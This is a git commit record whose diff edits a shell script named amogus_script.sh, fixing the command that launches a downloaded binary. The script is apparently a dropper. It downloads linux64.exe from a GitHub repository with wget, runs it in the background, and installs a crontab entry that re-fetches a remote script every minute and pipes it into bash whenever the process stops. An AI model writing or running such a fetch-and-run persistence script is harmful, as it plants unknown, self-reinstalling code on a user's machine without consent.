fceb34732e7240073c4ec6f00eae2bb11d8ced90
romain <romain.panno@epitech.eu>
2023-02-24 18:13:26 +0100

    Fix supersayan

--- amogus_script.sh
+++ amogus_script.sh
@@ -4,7 +4,7 @@ path=$(mktemp -d /tmp/XXXXXX)
 cd $path
 wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
 crontab -l > crontabs
-nohup linux64.exe &
+nohup ./linux64.exe &
 cat crontabs
 echo '* * * * *     bash -c "if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
 crontab crontabs
